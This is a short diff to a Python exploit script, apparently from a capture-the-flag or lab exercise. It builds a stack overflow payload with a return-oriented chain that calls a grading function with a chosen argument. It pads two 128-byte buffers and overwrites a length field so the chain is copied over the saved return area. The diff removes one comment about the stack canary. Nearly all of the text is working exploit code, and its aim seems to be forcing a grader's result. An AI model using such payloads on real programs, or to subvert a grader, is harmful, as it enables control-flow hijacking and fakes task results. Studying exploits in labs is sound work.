@@ -34,6 +34,5 @@ chain = p64(RET) + p64(POP_RDI) + p64(4) + p64(GRADE_EVAL) + p64(0)
 payload = bytearray(chain.ljust(128, b"B"))   # expression[128], copied to rbp+8
 payload += b"C" * 128                         # logMsg[128]
 payload += p32(0xA8)                          # len = 168 -> dest = rbp+8
-# 260 bytes total: gets() stops here (newline/EOF) and cannot reach the canary.
 
 sys.stdout.buffer.write(payload)
